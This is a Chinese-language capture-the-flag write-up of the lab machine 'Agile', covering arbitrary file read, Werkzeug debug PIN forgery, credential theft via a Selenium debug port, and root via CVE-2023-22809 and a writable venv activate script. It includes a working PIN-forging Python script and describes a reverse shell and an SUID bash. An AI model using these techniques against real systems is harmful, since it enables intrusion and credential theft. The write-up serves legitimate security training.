# Agile

Agile 是一个中等难度的 Linux 机器，在端口 80 上有一个密码管理网站。创建帐户并添加几个密码后，发现网站的导出到 CSV 功能容易受到任意文件读取的攻击。其他终结点的枚举显示“/download”在访问时引发错误，并显示“Werkzeug”调试控制台。此控制台通过 PIN 进行保护，但是此控制台与通过前面提到的漏洞读取文件的能力相结合，允许用户对此 PIN 进行逆向工程，并以“www-data”的形式执行系统命令。然后，可以识别数据库凭据，以便连接到密码管理器网站的 SQL 数据库，该数据库保存系统上“corum”用户的凭据。发现该网站的第二个版本正在运行，自动化系统通过“Selenium”网络驱动程序对其执行测试。“Selenium”的调试端口是开放的，通过SSH隧道，攻击者可以访问网站的测试环境并获取用户“edwards”的凭据。最后，“CVE-2023-22809”（全局“bashrc”文件中的自定义条目）和 Python 虚拟环境激活脚本上的错误权限的组合会导致权限提升。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/b510b26b-9e0d-44dc-b6ef-09714b173c2c.png)

### Web枚举

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/8f1adfeb-7d6d-aeea-ce12-4f8a6e64e08b.png)

注册一个账户并登录

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/f0a4eb94-6959-8cc1-2a46-3181462f61ad.png)

有个export功能，点击后查看bp发现一个/download，存在任意文件读取

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/f8c11404-2412-f4fa-5c85-b29110a07044.png)

概率触发报错

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/d7c79ee8-634c-437c-fa57-8f67bace52a1.png)

## Foldhold - PIN伪造

读machine-id

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/2340e5a1-981b-b930-ebec-6d47ce4fc462.png)

读网卡mac地址

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/19d2c6d2-814a-7241-1621-dd1c27feec56.png)

将地址转16进制

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/f666c5d1-fb91-aafb-ad8a-457268eeb1b4.png)

在报错当中，暴露了app.py的路径，在/etc/passwd里也看到www-data

	/app/venv/lib/python3.10/site-packages/flask/app.py

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/28331630-0e95-dbe0-d929-436524329772.png)

在这个werkzeug版本中还需要在machine-id后面拼接cgroup

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/a1316c96-62bb-f9e4-dbd1-c6d2f087a0b5.png)

伪造PIN exp

```python3
import hashlib
from itertools import chain
probably_public_bits = [
'www-data',# username
'flask.app',# modname
'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
'345052411386',# str(uuid.getnode())
'ed5b159560f54721827644bc9b220d00superpass.service'
]


h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/f515f9a5-9dfc-7e81-3023-789ebb3faf6c.png)

输入PIN后，现在可以执行python代码

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e1233fe8-bd67-aeaa-cdfd-556632320514.png)

祖传reverse shell

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/dd007d38-9ef7-6877-2878-2ce986cdf2b2.png)

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/cce9ffe1-c194-9c7e-9732-94377aaf201b.png)

## 本地横向移动 -> corum

在config_prod.json里发现了mysql的凭据

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/da016a1a-4834-ed62-d588-3079636933ef.png)

进mysql常规操作

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/24777327-1fa0-e30b-4f25-e5e529d6450f.png)

corum是系统中的用户，发现users表中的hash爆不出来

还有个passwords表，corum是密码直接是明文密码

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/c97cd864-b28c-8646-eb04-85454c703bb0.png)

直接登ssh

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/b0fc8b78-ac7c-91ca-2eb9-485acd04ec12.png)

## 本地横向移动 -> edwards

在test的站点里面发现一个py脚本，它从creds.txt读取凭据，使用selenium登录测试站点

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/bbdd68ea-f057-1188-2a3d-f8e40692f7fa-1.png)

往下看可以看到Selenium调试端口是41829

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/68fe198c-2b84-3b35-a49d-db08d40778ab.png)

用ssh做本地端口转发

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/bfeb48af-7e0d-e1ea-1c4a-02ba0a111e26.png)

由于没有chrome，而且还比较简单，后面就看wp做一下

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ef918393-1d66-9759-3adf-7e47fe7923a0.png)

inspect可以看到edwards的密码

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/b2f69fbe-cddc-db54-0238-c613fce544f5.png)

su过去

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/4b950dc0-89ab-bc9f-f434-cbec32772e2e.png)

## 本地权限提升

sudo -l

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/27363061-53d0-17fe-d335-79a35cd2ce97.png)

查看sudo版本后谷歌能够找到相关的提权cve

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/1e258602-d2e5-9279-2251-86c45215bcf4.png)

它能够让我们读取意外的文件，但目前我们只能模拟dev_admin执行

而在test_and_update.sh中加载了activate配置文件

```bash
dwards@agile:/app$ cat ./test_and_update.sh
#!/bin/bash
...
# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate
...
```

查看/etc/bash.bashrc发现也引用activate

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/387b7f4e-ce11-4c4a-b587-65131c7a8718.png)

由于activate，dev_admin用户可写，所以搭配上面的cve修改activate文件，写入shellcode

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/4f8a5933-cc8a-8f55-75b7-921d462fd368.png)

祖传suid bash

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/adb3bd92-d79b-33b8-7867-d9f036c4ef1b.png)

root flag还在老地方

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/c650b200-d16e-d1f3-66ba-11524be81b2a.png)

事后我猜测activate被root触发是因为定时任务，查找了一下发现确实是root有计划任务

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/2fef76b2-e096-1417-030c-a4c8e7d801f8.png)


